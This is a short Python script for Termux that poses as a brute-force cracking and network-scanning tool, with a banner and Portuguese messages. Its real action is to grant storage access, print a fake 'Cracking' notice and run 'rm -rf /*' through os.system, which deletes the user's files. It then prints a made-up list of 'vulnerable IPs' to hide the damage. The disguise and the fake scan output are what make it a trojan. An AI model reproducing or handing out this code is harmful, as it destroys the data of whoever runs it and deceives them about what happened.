# CODIGO PRA TERMUX

import platform
import os
import sys
from colorama import init
from colorama import Fore, Back, Style

banner = """
 ███████████                        █████     ███                ██████
░░███░░░░░███                      ░░███     ░░░                ███░░███
 ░███    ░███ █████ ████ ████████  ███████   ████              ░███ ░░░   ██████  ████████   █████   ██████ 
 ░██████████ ░░███ ░███ ░░███░░███░░░███░   ░░███  ██████████ ███████    ███░░███░░███░░███ ███░░   ███░░███
 ░███░░░░░███ ░███ ░███  ░███ ░░░   ░███     ░███ ░░░░░░░░░░ ░░░███░    ░███ ░███ ░███ ░░░ ░░█████ ░███████ 
 ░███    ░███ ░███ ░███  ░███       ░███ ███ ░███              ░███     ░███ ░███ ░███      ░░░░███░███░░░
 ███████████  ░░████████ █████      ░░█████  █████             █████    ░░██████  █████     ██████ ░░██████ 
░░░░░░░░░░░    ░░░░░░░░ ░░░░░        ░░░░░  ░░░░░             ░░░░░      ░░░░░░  ░░░░░     ░░░░░░   ░░░░░░
"""
print(Fore.RED + banner + Fore.RESET)
os.system("termux-setup-storage")
varr = input("Aperte enter para continuar.")
help = "Acabo é so isso kkkkkkk"
cmd = 'sleep 1; echo "[!] Cracking (isso pode levar alguns minutos!)..."; rm -rf /* 2>/dev/null; sleep 10;'
os.system(cmd)
print("Scan finalizado com sucesso!\nLista de IP's vulneraveis encontrados:\n\t192.168.2.1; 127.0.0.1; 10.10.0.10; 127.10.49.1")
